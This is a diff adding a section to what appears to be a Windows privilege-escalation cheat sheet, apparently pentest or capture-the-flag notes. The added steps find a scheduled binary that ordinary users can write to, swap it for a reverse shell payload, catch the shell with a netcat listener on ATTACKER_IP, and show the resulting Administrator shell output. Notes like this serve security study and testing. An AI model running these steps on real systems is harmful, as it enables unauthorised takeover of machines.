@@ -568,6 +568,57 @@ icacls C:\Scripts\task_script.bat
 ```
 - If writable, replace contents with a reverse shell or adduser command
 
+### Exploit Writable Scheduled Binaries
+
+Look for backup directories and task hints that reference binaries run on a schedule:
+
+```cmd
+dir C:\Backup
+type C:\Backup\info.txt
+```
+
+Useful hint:
+
+```text
+Run every 5 minutes:
+C:\Backup\TFTP.EXE -i TARGET get backup.txt
+```
+
+Check whether low-privileged users can modify the binary:
+
+```cmd
+icacls C:\Backup\TFTP.EXE
+```
+
+Writable ACL pattern:
+
+```text
+C:\Backup\TFTP.EXE BUILTIN\Users:(I)(F)
+                   NT AUTHORITY\Authenticated Users:(I)(M)
+```
+
+Replace the scheduled binary with a reverse shell payload:
+
+```cmd
+copy C:\Backup\TFTP.EXE backupTFTP.exe
+del C:\Backup\TFTP.EXE
+copy C:\Users\USER\Desktop\shell.exe C:\Backup\TFTP.EXE
+```
+
+Wait for the scheduled run:
+
+```bash
+nc -nlvp 80
+```
+
+Successful Administrator shell:
+
+```text
+connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
+C:\WINDOWS\system32>whoami
+HOSTNAME\administrator
+```
+
 ## User/Computer Description Field
 - Sysadmins sometimes store passwords in user or computer description fields
 ```powershell
